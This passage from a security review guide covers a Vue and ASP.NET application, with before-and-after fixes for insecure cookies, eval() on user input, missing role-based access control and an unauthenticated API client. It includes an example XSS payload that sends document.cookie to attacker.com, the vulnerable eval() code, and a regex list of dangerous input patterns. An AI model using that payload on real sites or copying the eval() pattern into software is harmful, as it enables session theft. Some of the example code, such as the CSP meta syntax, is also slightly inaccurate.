            cookieContext.Cookie.SameSite = SameSiteMode.Strict;
        }
    };
});
```

## Learning Point

**Rule: All cookies containing authentication/session data must have security flags enabled.**

- ❌ Cookies without `HttpOnly` flag
- ❌ Authentication cookies sent over HTTP (no `Secure` flag)
- ❌ Cookies vulnerable to CSRF (no `SameSite` flag)
- ❌ Storing sensitive data directly in cookies
- ✅ Always use `HttpOnly`, `Secure`, `SameSite` flags
- ✅ Keep cookie values server-side, cookie holds session ID only
- ✅ Implement server-side session validation
- ✅ Rotate session tokens regularly

---

# 🚨 CRITICAL ISSUE #6: eval() with User Input (T1)

**Location:** [XssView.vue](XssView.vue#L31)  
**Severity:** CRITICAL (CVSS 9.9 - Remote Code Execution)

## What's the Security Risk?

The component uses `eval()` to execute user-supplied input as JavaScript:

```typescript
// VULNERABLE - Line 31
const xssString = `alert(\`Inserted ${inputString.value}\`)`;
submittedInputs.value.push(xssString);

eval(xssString);  // ❌ Executes arbitrary JavaScript
```

If user enters: `test"); fetch('http://attacker.com/steal?cookie=' + document.cookie); alert("`

The executed code becomes:
```javascript
alert(`Inserted test"); fetch('http://attacker.com/steal?cookie=' + document.cookie); alert("`);
```

Result: Attacker steals session cookies, localStorage, credentials.

## Why is this dangerous?

1. **Arbitrary Code Execution** - Any JavaScript code runs in application context
2. **Cookie/Token Theft** - Attacker accesses `document.cookie`, `localStorage`
3. **Keylogging** - Can intercept user keystrokes
4. **Phishing** - Can display fake login form overlaid on app
5. **Malware Distribution** - Can load external scripts
6. **Account Takeover** - Can perform actions as logged-in user
7. **Data Exfiltration** - Can access sensitive page data

## The Fix

**BEFORE (Highly Vulnerable):**
```typescript
<script setup lang="ts">
import { ref } from 'vue';

const inputString = ref<string>('');
const submittedInputs = ref<string[]>(["Initial input"]);

const handleSubmit = () => {
    if (!inputString.value) { return; }

    if (inputString.value.trim()) {
        const xssString = `alert(\`Inserted ${inputString.value}\`)`;  // ❌ String interpolation
        submittedInputs.value.push(xssString);
        
        eval(xssString);  // ❌ CRITICAL: Executes arbitrary code
        inputString.value = '';
    }
};
</script>
```

**AFTER (Secure):**
```typescript
<template>
    <div class="xss-demo">
        <h1>Input Handler Demo</h1>
        
        <div class="input-form">
            <form @submit.prevent="handleSubmit">
                <input 
                    type="text"
                    v-model="inputString" 
                    placeholder="Enter text here"
                    autocomplete="off"
                    maxlength="100"  <!-- ✅ Input validation -->
                />
                <button type="submit">Submit</button>
            </form>
        </div>
        
        <div class="results" v-if="submittedInputs.length > 0">
            <h2>Submitted Inputs</h2>
            <table>
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Input</th>
                    </tr>
                </thead>
                <tbody>
                    <tr v-for="(input, index) in submittedInputs" :key="index">
                        <td>{{ index + 1 }}</td>
                        <!-- ✅ Vue automatically escapes text interpolation -->
                        <td>{{ input }}</td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
</template>

<script setup lang="ts">
import { ref, computed } from 'vue';

const inputString = ref<string>('');
const submittedInputs = ref<string[]>(["Initial input"]);

// ✅ Sanitization function
function sanitizeInput(input: string): string {
    if (!input) return '';
    
    return input
        .trim()
        .substring(0, 100)  // Max length
        .replace(/[<>\"'&]/g, (char) => {  // Escape HTML special chars
            const entities: { [key: string]: string } = {
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#x27;',
                '&': '&amp;'
            };
            return entities[char] || char;
        });
}

// ✅ Validation function
function isValidInput(input: string): boolean {
    if (!input || input.trim().length === 0) return false;
    if (input.length > 100) return false;
    
    // ✅ Reject potentially dangerous patterns (whitelist approach)
    const dangerousPatterns = [
        /<script/i,
        /javascript:/i,
        /on\w+\s*=/i,  // Event handlers
        /eval\(/i,
        /expression\(/i,
        /vbscript:/i
    ];
    
    for (const pattern of dangerousPatterns) {
        if (pattern.test(input)) {
            console.warn('Dangerous input detected:', input);
            return false;
        }
    }
    
    return true;
}

// ✅ Safe handler - NO eval()
const handleSubmit = () => {
    // Input validation
    if (!isValidInput(inputString.value)) {
        console.error('Invalid input');
        return;
    }
    
    // Sanitize before storing
    const cleanedInput = sanitizeInput(inputString.value);
    
    // Store sanitized input
    submittedInputs.value.push(cleanedInput);
    
    // ✅ Show message safely - never use eval()
    showSuccessMessage(cleanedInput);
    
    inputString.value = '';
};

// ✅ Safe alternative to eval()
function showSuccessMessage(input: string): void {
    // Option 1: Simple alert (safe - string, not code)
    alert(`You entered: ${input}`);
    
    // Option 2: DOM manipulation with safe content
    const messageDiv = document.createElement('div');
    messageDiv.textContent = `Success: ${input}`;  // textContent is safer than innerHTML
    messageDiv.className = 'success-message';
    document.body.appendChild(messageDiv);
    
    // Option 3: Emit event (for parent component)
    emit('input-submitted', {
        value: input,
        timestamp: new Date()
    });
}

// ✅ Computed property for safe display
const displayCount = computed(() => submittedInputs.value.length);
</script>

<style scoped>
.xss-demo {
    padding: 20px;
}

.input-form input {
    padding: 8px;
    border: 1px solid #ddd;
    border-radius: 4px;
    width: 300px;
}

.input-form button {
    padding: 8px 16px;
    background: #007bff;
    color: white;
    border: none;
    border-radius: 4px;
    cursor: pointer;
}

.input-form button:hover {
    background: #0056b3;
}

.results {
    margin-top: 20px;
}

table {
    border-collapse: collapse;
    width: 100%;
}

th, td {
    border: 1px solid #ddd;
    padding: 12px;
    text-align: left;
}

th {
    background-color: #f8f9fa;
    font-weight: bold;
}

.success-message {
    padding: 10px;
    background-color: #d4edda;
    color: #155724;
    border: 1px solid #c3e6cb;
    border-radius: 4px;
    margin-top: 10px;
}
</style>
```

## Best Practice

### 1. **Never Use eval() - Alternatives**
```typescript
// ❌ NEVER DO THIS:
const userFormula = getUserInput();
eval(userFormula);  // WORST


// ✅ Alternative 1: Use JSON.parse for data
const userData = getUserJson();
const parsed = JSON.parse(userData);  // Safe - parsing only


// ✅ Alternative 2: Use Function constructor (slightly safer, still risky)
const safeMath = new Function('a', 'b', 'return a + b');
safeMath(5, 3);  // Returns 8


// ✅ Alternative 3: Use expression evaluator library
import * as math from 'mathjs';
const result = math.evaluate('2 + 3 * 4');  // Uses parser, not eval


// ✅ Best: Design application to not need code execution
// Store data, don't execute user input as code
```

### 2. **Input Validation & Sanitization**
```typescript
// ✅ Multi-layer defense

// Layer 1: Length validation
function validateLength(input: string, max: number = 100): boolean {
    return input.length <= max;
}

// Layer 2: Type validation
function validateType(input: any): boolean {
    return typeof input === 'string';
}

// Layer 3: Content validation (whitelist)
function validateContent(input: string, allowedChars: RegExp): boolean {
    return allowedChars.test(input);
}

// Layer 4: Sanitization (remove bad stuff)
function sanitizeHTML(input: string): string {
    const textarea = document.createElement('textarea');
    textarea.textContent = input;
    return textarea.innerHTML;  // Escapes HTML
}

// Layer 5: Optional - specialized sanitizer
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(input);
```

### 3. **Vue Security Best Practices**
```typescript
// ❌ Dangerous - innerHTML allows XSS
<div v-html="userContent"></div>

// ✅ Safe - text interpolation escapes HTML
<div>{{ userContent }}</div>

// ✅ Safe - textContent (plain text)
<div ref="element"></div>
<script>
  element.value.textContent = userInput;  // Safe
</script>

// ✅ Safe - sanitized HTML
<div v-html="sanitizedContent"></div>
<script>
  const sanitizedContent = DOMPurify.sanitize(userHTML);
</script>

// ✅ Safe - binding attributes
<img :src="imageUrl" :alt="altText" />

// ❌ Dangerous - binding event handlers from user input
<button @click="eval(userCode)"></button>  // NEVER

// ✅ Safe - predefined event handlers
<button @click="handleClick"></button>
</script>
```

### 4. **Content Security Policy (CSP)**
```typescript
// ✅ Add to HTML header or as meta tag
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self';
               unsafe-eval none;
               unsafe-inline none;">

// ✅ Or configure in server response headers
response.setHeader('Content-Security-Policy', 
  "default-src 'self'; " +
  "script-src 'self' https://trusted-cdn.com; " +
  "style-src 'self' 'unsafe-inline'; " +
  "img-src 'self' data: https:; " +
  "font-src 'self'; " +
  "connect-src 'self' https://api.company.com; " +
  "frame-ancestors 'none'; " +
  "base-uri 'self'; " +
  "form-action 'self';"
);

// CSP prevents:
// - eval(), new Function(), setTimeout with strings
// - Inline scripts and styles
// - Loading scripts from non-whitelisted domains
// - Frames from other origins
```

## Learning Point

**Rule: NEVER execute user input as code. NEVER use eval().**

- ❌ `eval(userInput)`
- ❌ `new Function(userCode)`
- ❌ `setTimeout(userCode, 1000)`
- ❌ Template literals with interpolation passed to eval
- ❌ `innerHTML` with unsanitized content
- ✅ Validate and sanitize all user input
- ✅ Use text nodes, not HTML
- ✅ Whitelist allowed characters
- ✅ Use expression evaluators for math/formulas
- ✅ Implement Content Security Policy

---

# 🚨 CRITICAL ISSUE #7: No Authorization Enforcement

**Location:** [BasicAuthenticationHandler.cs](BasicAuthenticationHandler.cs), [Startup.cs](Startup.cs)  
**Severity:** CRITICAL (CVSS 9.3)

## What's the Security Risk?

The application uses `[Authorize]` decorator but implements it incorrectly:

1. **Single Credential for All Users** - All authorized requests use same credential
2. **No Role-Based Access Control (RBAC)** - All users have identical permissions
3. **No Granular Policies** - Can't distinguish between admin, user, guest roles
4. **[AllowAnonymous] Override** - Decorator can be forgot or misapplied

```csharp
// Creates only one claim - no role differentiation
var claims = new[] {
    new Claim(ClaimTypes.Name, "AuthenticatedUser"),  // ❌ Same for everyone
};
```

## Why is this dangerous?

1. **Privilege Escalation** - Any authenticated user has all permissions
2. **No Access Control** - Cannot restrict admin functions to admins
3. **Regulatory Failure** - Cannot audit who did what
4. **Horizontal Privilege Escalation** - Users can access peers' data
5. **Vertical Privilege Escalation** - Users can access admin functions
6. **No Revocation** - Cannot revoke specific user access, must rotate secret

## The Fix

**BEFORE (Inadequate):**
```csharp
// BasicAuthenticationHandler.cs - ❌ Only creates Name claim
var claims = new[] {
    new Claim(ClaimTypes.Name, "AuthenticatedUser"),  // SAME FOR ALL USERS
};
```

**AFTER (Secure with RBAC):**

**Step 1: Enhance Authentication Handler**
```csharp
public class ApiKeyAuthenticationHandler : AuthenticationHandler<AuthenticationSchemeOptions>
{
    private readonly IApiKeyService _apiKeyService;
    private readonly IUserService _userService;
    
    public ApiKeyAuthenticationHandler(
        IOptionsMonitor<AuthenticationSchemeOptions> options,
        ILoggerFactory logger,
        UrlEncoder encoder,
        ISystemClock clock,
        IApiKeyService apiKeyService,
        IUserService userService) 
        : base(options, logger, encoder, clock)
    {
        _apiKeyService = apiKeyService;
        _userService = userService;
    }
    
    protected override async Task<AuthenticateResult> HandleAuthenticateAsync()
    {
        if (!Request.Headers.TryGetValue("X-API-Key", out var apiKeyHeader))
        {
            return AuthenticateResult.Fail("Missing API Key");
        }
        
        // ✅ Validate API key
        var validApiKey = await _apiKeyService.ValidateApiKeyAsync(apiKeyHeader.ToString());
        if (validApiKey == null)
        {
            return AuthenticateResult.Fail("Invalid API Key");
        }
        
        // ✅ Retrieve associated user
        var user = await _userService.GetUserAsync(validApiKey.UserId);
        if (user == null)
        {
            return AuthenticateResult.Fail("User not found");
        }
        
        // ✅ Build claims with role information
        var claims = new List<Claim>
        {
            new Claim(ClaimTypes.NameIdentifier, user.Id.ToString()),
            new Claim(ClaimTypes.Name, user.Username),
            new Claim(ClaimTypes.Email, user.Email),
            new Claim("api-key-id", validApiKey.Id.ToString()),
        };
        
        // ✅ Add role claims
        foreach (var role in user.Roles)
        {
            claims.Add(new Claim(ClaimTypes.Role, role));
        }
        
        // ✅ Add permission claims for granular control
        foreach (var permission in user.Permissions)
        {
            claims.Add(new Claim("permission", permission));
        }
        
        var identity = new ClaimsIdentity(claims, Scheme.Name);
        var principal = new ClaimsPrincipal(identity);
        var ticket = new AuthenticationTicket(principal, Scheme.Name);
        
        return AuthenticateResult.Success(ticket);
    }
}
```

**Step 2: Define Authorization Policies**
```csharp
// Startup.cs
public void ConfigureServices(IServiceCollection services)
{
    services.AddAuthentication("ApiKeyAuthentication")
        .AddScheme<AuthenticationSchemeOptions, ApiKeyAuthenticationHandler>(
            "ApiKeyAuthentication", null);
    
    // ✅ Define authorization policies
    services.AddAuthorization(options =>
    {
        // Role-based policies
        options.AddPolicy("AdminOnly", policy =>
            policy.RequireRole("Admin"));
        
        options.AddPolicy("UserOrAdmin", policy =>
            policy.RequireRole("User", "Admin"));
        
        // Permission-based policies
        options.AddPolicy("CanDeleteUsers", policy =>
            policy.RequireClaim("permission", "delete:users"));
        
        options.AddPolicy("CanViewReports", policy =>
            policy.RequireClaim("permission", "view:reports"));
        
        // Combination policies
        options.AddPolicy("AdminWithMFA", policy =>
            policy.RequireRole("Admin")
                  .RequireClaim("mfa-verified", "true"));
        
        // Custom policy
        options.AddPolicy("OwnDataOnly", policy =>
            policy.Requirements.Add(new OwnDataRequirement()));
    });
    
    // ✅ Register custom authorization handler
    services.AddScoped<IAuthorizationHandler, OwnDataAuthorizationHandler>();
}
```

**Step 3: Implement Controllers with Proper Authorization**
```csharp
[ApiController]
[Route("api/[controller]")]
[Authorize]  // ✅ Default to authenticated
public class UsersController : ControllerBase
{
    private readonly IUserService _userService;
    private readonly IAuditLogger _auditLogger;
    
    // ✅ Public endpoint - explicit AllowAnonymous
    [HttpGet("{id}")]
    [AllowAnonymous]
    public async Task<ActionResult<PublicUserDto>> GetPublicProfileAsync(int id)
    {
        var user = await _userService.GetUserAsync(id);
        return Ok(new PublicUserDto { Id = user.Id, Username = user.Username });
    }
    
    // ✅ Authenticated users only
    [HttpGet("me/profile")]
    [Authorize]
    public async Task<ActionResult<UserProfileDto>> GetOwnProfileAsync()
    {
        var userId = int.Parse(User.FindFirst(ClaimTypes.NameIdentifier).Value);
        var user = await _userService.GetUserAsync(userId);
        return Ok(MapToUserProfileDto(user));
    }
    
    // ✅ Admin only
    [HttpGet("all")]
    [Authorize(Roles = "Admin")]
    [ProducesResponseType(StatusCodes.Status403Forbidden)]
    public async Task<ActionResult<IEnumerable<UserDto>>> GetAllUsersAsync()
    {
        var users = await _userService.GetAllUsersAsync();
        _auditLogger.LogAccess(User.FindFirst(ClaimTypes.NameIdentifier).Value, 
                               "GetAllUsers", "Success");
        return Ok(users.Select(MapToUserDto));
    }
    
    // ✅ Permission-based
    [HttpDelete("{id}")]
    [Authorize(Policy = "CanDeleteUsers")]
    [ProducesResponseType(StatusCodes.Status403Forbidden)]
    public async Task<ActionResult> DeleteUserAsync(int id)
    {
        var deletedBy = User.FindFirst(ClaimTypes.NameIdentifier).Value;
        await _userService.DeleteUserAsync(id);
        
        _auditLogger.LogAccess(deletedBy, $"DeleteUser({id})", "Success");
        
        return NoContent();
    }
    
    // ✅ Custom policy - own data only
    [HttpPut("{id}")]
    [Authorize(Policy = "OwnDataOnly")]
    [ProducesResponseType(StatusCodes.Status403Forbidden)]
    public async Task<ActionResult<UserDto>> UpdateUserAsync(int id, UpdateUserDto dto)
    {
        var userId = int.Parse(User.FindFirst(ClaimTypes.NameIdentifier).Value);
        
        if (id != userId && !User.IsInRole("Admin"))
        {
            return Forbid();
        }
        
        var updated = await _userService.UpdateUserAsync(id, dto);
        return Ok(MapToUserDto(updated));
    }
}
```

**Step 4: Custom Authorization Handler**
```csharp
public class OwnDataRequirement : IAuthorizationRequirement { }

public class OwnDataAuthorizationHandler : 
    AuthorizationHandler<OwnDataRequirement>
{
    protected override Task HandleRequirementAsync(
        AuthorizationHandlerContext context,
        OwnDataRequirement requirement)
    {
        // ✅ Allow admins always
        if (context.User.IsInRole("Admin"))
        {
            context.Succeed(requirement);
            return Task.CompletedTask;
        }
        
        // ✅ For regular users, check if accessing own data
        var userId = context.User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
        var resourceOwnerId = context.Resource as string;
        
        if (userId == resourceOwnerId)
        {
            context.Succeed(requirement);
        }
        else
        {
            context.Fail();
        }
        
        return Task.CompletedTask;
    }
}
```

**Step 5: Role & Permission Model**
```csharp
// Domain Models
public class User
{
    public int Id { get; set; }
    public string Username { get; set; }
    public string Email { get; set; }
    public List<Role> Roles { get; set; }  // ✅ Many-to-many
    public List<Permission> Permissions { get; set; }  // ✅ Direct permissions (fine-grained)
}

public class Role
{
    public int Id { get; set; }
    public string Name { get; set; }  // "Admin", "User", "Moderator"
    public List<Permission> Permissions { get; set; }  // Permissions granted by this role
}

public class Permission
{
    public int Id { get; set; }
    public string Name { get; set; }  // "delete:users", "view:reports", "edit:profile"
    public string Description { get; set; }
}
```

## Best Practice

### 1. **Authorization Decision Tree**
```
Is endpoint public?
├─ YES: [AllowAnonymous] for legitimate reasons only
└─ NO: [Authorize] by default
    Is role-based?
    ├─ YES: [Authorize(Roles = "Admin,Manager")]
    └─ NO: Is permission-based?
        ├─ YES: [Authorize(Policy = "CanDeleteUsers")]
        └─ NO: Is resource-owner-based?
            └─ YES: [Authorize(Policy = "OwnDataOnly")]
```

### 2. **Principle of Least Privilege**
```csharp
// ✅ Start with NO access
[Authorize]  // Already authenticated, but...

// ✅ Explicitly grant access
[Authorize(Roles = "Admin")]  // Only admin

// ✅ Or
[Authorize(Policy = "SpecificPermission")]  // Only with this permission

//❌ Giving too much
[AllowAnonymous]  // Don't do this for sensitive data

[Authorize]  // Without specific role/policy
```

### 3. **Audit Trail**
```csharp
public class AuditLog
{
    public int Id { get; set; }
    public string UserId { get; set; }
    public string Action { get; set; }
    public string Resource { get; set; }
    public string Result { get; set; }  // "Success", "Denied", "Error"
    public string DenyReason { get; set; }  // Why was it denied?
    public DateTime Timestamp { get; set; }
    public string IpAddress { get; set; }
}

// Always log authorization decisions
_auditLogger.Log(new AuditLog
{
    UserId = userId,
    Action = "DeleteUser",
    Resource = $"User:{targetUserId}",
    Result = User.IsInRole("Admin") ? "Success" : "Denied",
    DenyReason = !User.IsInRole("Admin") ? "Insufficient Role" : null,
    Timestamp = DateTime.UtcNow,
    IpAddress = Request.HttpContext.Connection.RemoteIpAddress.ToString()
});
```

## Learning Point

**Rule: Implement proper Role-Based Access Control (RBAC) and permission checking.**

- ❌ All authenticated users have same permissions
- ❌ No role differentiation
- ❌ Forgetting `[Authorize]` on sensitive endpoints
- ❌ Using `[AllowAnonymous]` for protected data
- ✅ Always use `[Authorize]` by default
- ✅ Implement RBAC with meaningful roles
- ✅ Use permission-based policies for fine-grained control
- ✅ Log all authorization successes and failures
- ✅ Follow principle of least privilege

---

# 🚨 CRITICAL ISSUE #8: Sensitive Data in Plain Text (API Client)

**Location:** [api.ts](api.ts#L1-L2)  
**Severity:** CRITICAL (CVSS 8.7)

## What's the Security Risk?

The API client makes requests without authentication and uses comment/documentation that could expose configuration:

```typescript
// API base URL - adjust this to point to your .NET API
const API_BASE_URL = 'https://localhost:5001/api';  // ❌ Hardcoded URL

// No authentication mechanism
export async function fetchData<T>(endpoint: string): Promise<T> {
  try {
    const response = await fetch(`${API_BASE_URL}/${endpoint}`);  // ❌ No credentials
    // ...
}
```

## Why is this dangerous?

1. **No Authentication** - Requests don't prove the client's identity
2. **No CSRF Protection** - Requests can be made from any origin
3. **Configuration Exposure** - API URL reveals infrastructure
4. **No Encryption** - Relies on HTTPS layer only, no application-level encryption
5. **Client-Side Secrets** - Any API keys/tokens are visible in browser
6. **Man-in-the-Middle** - Certificate pinning not implemented
7. **CORS Misconfiguration** - Can leak headers and data

## The Fix

**BEFORE (Insecure):**
```typescript
// ❌ Hardcoded URL
const API_BASE_URL = 'https://localhost:5001/api';

export async function fetchData<T>(endpoint: string): Promise<T> {
  try {
    // ❌ No authentication
    const response = await fetch(`${API_BASE_URL}/${endpoint}`);
    
    if (!response.ok) {
      throw new Error(`API error: ${response.status}`);
    }
    
    return await response.json() as T;
  } catch (error) {
    console.error('API request failed:', error);  // ❌ Logs errors to console
    throw error;
  }
}
```

**AFTER (Secure):**
```typescript
// ✅ Config-driven from environment
const API_BASE_URL = import.meta.env.VITE_API_BASE_URL || '/api';

// ✅ CSRF token management
let csrfToken: string | null = null;

/**
 * ✅ Retrieves CSRF token from server
 */
async function getCsrfToken(): Promise<string> {
    if (csrfToken) {
        return csrfToken;
    }
    
    try {
        const response = await fetch(`${API_BASE_URL}/csrf-token`, {
            method: 'GET',
            credentials: 'include',  // ✅ Include cookies
            headers: {
                'Accept': 'application/json'
            }
        });
        
        if (!response.ok) {
            throw new Error(`Failed to get CSRF token: ${response.status}`);
        }
        
        const data = await response.json();
        csrfToken = data.token;
        return csrfToken;
    } catch (error) {
        console.error('CSRF token retrieval failed');
        throw new Error('Security error: Cannot establish secure session');
    }
}

/**
 * ✅ Secure GET request
 */
export async function fetchData<T>(endpoint: string): Promise<T> {
    try {
        const response = await fetch(`${API_BASE_URL}/${endpoint}`, {
            method: 'GET',
            credentials: 'include',  // ✅ Include session cookies
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'X-CSRF-Token': await getCsrfToken(),  // ✅ CSRF protection
                'X-Requested-With': 'XMLHttpRequest'  // ✅ Identify AJAX
            }
        });
        
        if (!response.ok) {
            // ✅ Handle HTTP errors properly
            if (response.status === 401) {
                // ✅ Unauthorized - trigger re-authentication
                handleUnauthorized();
            } else if (response.status === 403) {
                // ✅ Forbidden - insufficient permissions
                throw new Error('You do not have permission to access this resource');
            }
            throw new Error(`API error: ${response.status}`);
        }
        
        return await response.json() as T;
    } catch (error) {
        // ✅ Log securely - don't expose sensitive info
        if (error instanceof Error) {
            logSecurityEvent('API request failed', {
                endpoint: endpoint,
                errorType: error.name
                // ❌ NEVER log: error.message, response body, tokens
            });
        }
        throw error;
    }
}

/**
 * ✅ Secure POST request with CSRF protection
 */
export async function postData<T>(
    endpoint: string, 
    data: any,
    options?: RequestInit
): Promise<T> {
    try {
        // ✅ Validate input
        if (!isValidPayload(data)) {
            throw new Error('Invalid request payload');
        }
        
        const response = await fetch(`${API_BASE_URL}/${endpoint}`, {
            method: 'POST',
            credentials: 'include',  // ✅ Include cookies
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'X-CSRF-Token': await getCsrfToken(),  // ✅ CSRF token
                'X-Requested-With': 'XMLHttpRequest',
                ...options?.headers  // Allow header overrides
            },
            body: JSON.stringify(data),
            ...options
        });
        
        if (!response.ok) {
            if (response.status === 401) {
                handleUnauthorized();
            } else if (response.status === 403) {
                throw new Error('Operation not allowed');
            }
            throw new Error(`API error: ${response.status}`);
        }
        
        return await response.json() as T;
    } catch (error) {
        logSecurityEvent('API POST failed', { endpoint });
        throw error;
    }
}

/**
 * ✅ Secure DELETE request
 */
export async function deleteData(endpoint: string): Promise<void> {
    try {
        const response = await fetch(`${API_BASE_URL}/${endpoint}`, {
            method: 'DELETE',
            credentials: 'include',
            headers: {
                'Accept': 'application/json',
                'X-CSRF-Token': await getCsrfToken(),
                'X-Requested-With': 'XMLHttpRequest'
            }
        });
        
        if (!response.ok) {
            throw new Error(`Delete failed: ${response.status}`);
        }
    } catch (error) {
        logSecurityEvent('API DELETE failed', { endpoint });
        throw error;
    }
}

/**
 * ✅ Request validation
 */
function isValidPayload(data: any): boolean {
    if (!data) return false;
    
    // ✅ Check data size to prevent DOS
    const json = JSON.stringify(data);
    if (json.length > 1_000_000) {  // 1MB max
        return false;
    }
    
    // ✅ No XSS patterns
    if (typeof data === 'string' && /^<script/i.test(data)) {
        return false;
    }
    
    return true;
}

/**
 * ✅ Security event logging
 */
function logSecurityEvent(event: string, context?: any): void {
    // ✅ Send to secure backend logging
    // ❌ NEVER log to console in production
    if (import.meta.env.DEV) {
        console.warn(event, context);
    }
    
    // Send to secure backend
    sendToSecureLogger(event, context);
}

function sendToSecureLogger(event: string, context: any): void {
    // Call backend logging endpoint (not exposed to public)
    fetch('/api/logs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ event, context, timestamp: new Date() })
    }).catch(() => {
        // Silently fail - don't throw on logging failure
    });
}

/**
 * ✅ Handle unauthorized (401) responses
 */
function handleUnauthorized(): void {
    // ✅ Clear local authentication state
    csrfToken = null;
    localStorage.removeItem('session-info');
    
    // ✅ Redirect to login
    window.location.href = '/login';
}

/**
 * ✅ Request interceptor for common headers
 */
export function createSecureHeaders(): HeadersInit {
    return {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'X-App-Version': import.meta.env.VITE_APP_VERSION,
        'X-Client-ID': getClientId()  // ✅ Track client
    };
}

/**
 * ✅ Generate/retrieve client ID for audit trail
 */
function getClientId(): string {
    let clientId = sessionStorage.getItem('client-id');
    
    if (!clientId) {
        clientId = generateUUID();
        sessionStorage.setItem('client-id', clientId);
    }
    
    return clientId;
}

function generateUUID(): string {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16 | 0;
        var v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}
```

**Environment Configuration Files:**
```typescript
// ✅ .env.development
VITE_API_BASE_URL=https://localhost:5001/api
VITE_APP_VERSION=1.0.0-dev

// ✅ .env.production
VITE_API_BASE_URL=https://api.company.com/v1
VITE_APP_VERSION=1.0.0

// ❌ .env.production (Never commit actual secrets)
```

**Backend CORS Configuration:**
```csharp
// Startup.cs - ✅ Secure CORS setup
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("SecurePolicy", builder =>
        {
            builder
                .WithOrigins(GetAllowedOrigins())  // ✅ Whitelist specific origins
                .AllowAnyMethod()  // GET, POST, etc.
                .AllowAnyHeader()
                .AllowCredentials()  // ✅ Allow cookies
                .WithExposedHeaders("X-CSRF-Token")  // ✅ Expose CSRF token
                .WithMaxAge(3600);  // ✅ Cache preflight
        });
    });
}

private string[] GetAllowedOrigins()
{
    var environment = Environment.GetEnvironmentVariable("ASPNETCORE_ENVIRONMENT");
    
    return environment == "Development"
        ? new[] { "https://localhost:3000", "https://localhost:3001" }  // Dev origins
        : new[] { "https://app.company.com", "https://www.company.com" };  // Production origins only
}

public void Configure(IApplicationBuilder app)
{
    app.UseCors("SecurePolicy");
    // ... rest of configuration
}
```

**Backend CSRF Token Endpoint:**
```csharp
[HttpGet("csrf-token")]
[AllowAnonymous]
public ActionResult<CsrfTokenResponse> GetCsrfToken()
{
    var token = new CsrfTokenProvider().GenerateToken();
    
    Response.Cookies.Append(
        "X-CSRF-Token",
        token,
        new CookieOptions
        {
            HttpOnly = false,  // ✅ JavaScript can read
            Secure = true,
            SameSite = SameSiteMode.Strict,
            Expires = DateTime.UtcNow.AddHours(1)
        });
    
    return Ok(new CsrfTokenResponse { Token = token });
}

public class CsrfTokenResponse
{
    public string Token { get; set; }
}
```

## Best Practice

### 1. **Security Headers on All Responses**
```csharp
// Startup.cs middleware
app.Use(async (context, next) =>
{
    // ✅ Prevent clickjacking
    context.Response.Headers.Add("X-Frame-Options", "DENY");
    
    // ✅ Prevent MIME type sniffing
    context.Response.Headers.Add("X-Content-Type-Options", "nosniff");
    
    // ✅ Enable XSS protection
    context.Response.Headers.Add("X-XSS-Protection", "1; mode=block");
    
    // ✅ Referrer policy
    context.Response.Headers.Add("Referrer-Policy", "strict-origin-when-cross-origin");
    
    // ✅ Force HTTPS and HSTS
    context.Response.Headers.Add(
        "Strict-Transport-Security", 
        "max-age=31536000; includeSubDomains; preload");
    
    // ✅ Content Security Policy
    context.Response.Headers.Add(
        "Content-Security-Policy",
        "default-src 'self'; " +
        "script-src 'self' https://trusted-cdn.com; " +
        "style-src 'self' 'unsafe-inline'; " +
        "img-src 'self' data: https:; " +
        "connect-src 'self' https://api.company.com; " +
        "frame-ancestors 'none'");
    
    await next();
});
```

### 2. **Error Handling - Don't Leak Information**
```typescript
// ❌ Bad - exposes too much info
catch (error) {
    console.error(`Failed to call ${endpoint}:`, error.message, error.stack);
    alert(`Error: ${error.message}`);  // Shows to user
}

// ✅ Good - generic messages
catch (error) {
    logToSecureBackend(error);  // Log securely
    console.error('Request failed');  // Generic message
    
    if (error instanceof TypeError) {
        showUserMessage('Network error. Please try again.');
    } else if (error instanceof SyntaxError) {
        showUserMessage('Invalid response. Contact support.');
    } else {
        showUserMessage('An error occurred. Please try again.');
    }
}
```

### 3. **Request/Response Validation**
```typescript
// ✅ Validate API responses before using
export async function fetchUserAsync(userId: number): Promise<User> {
    const response = await fetchData<any>(`/users/${userId}`);
    
    // ✅ Validate response shape
    if (!response.id || !response.username) {
        throw new Error('Invalid user response');
    }
    
    // ✅ Validate data types
    if (typeof response.id !== 'number' || typeof response.username !== 'string') {
        throw new Error('Invalid user data types');
    }
    
    // ✅ Map to typed object
    return {
        id: response.id,
        username: response.username,
        email: response.email || ''
    };
}
```

## Learning Point

**Rule: Secure all client-server communication with authentication, CSRF protection, and secure headers.**

- ❌ Unauthenticated API requests
- ❌ Hardcoded API credentials in frontend
- ❌ Missing CSRF tokens
- ❌ No security headers
- ❌ Verbose error messages
- ✅ Include authentication tokens/cookies
- ✅ Send CSRF tokens with state-changing requests
- ✅ Set security headers (HSTS, CSP, etc.)
- ✅ Generic error messages to users
- ✅ Proper CORS configuration
- ✅ Environment-specific configuration

---

# Summary Table: Quick Reference

| Issue | Risk | Fix | Priority |
|-------|------|-----|----------|
| **I1: Hardcoded JWT Tokens** | Full system compromise, credential theft | Generate JWTs dynamically, store secrets securely | 🔴 CRITICAL |
| **S1: Hardcoded Auth Credential** | Single point of failure, no audit trail | Use database-backed API keys with hashing, implement rotation | 🔴 CRITICAL |
| **I2: Swagger Password Hint** | Information disclosure, reduced search space | Remove hints, disable Swagger in production | 🔴 CRITICAL |
| **E1: AllowAnonymous on Sensitive Endpoint** | Unauthorized access to secrets | Apply `[Authorize]` by default | 🔴 CRITICAL |
| **T2: Insecure Cookies** | JavaScript access, HTTP transmission | Set HttpOnly, Secure, SameSite flags | 🔴 CRITICAL |
| **T1: eval() with User Input** | Remote code execution, data theft | Never use eval(), sanitize input, implement CSP | 🔴 CRITICAL |
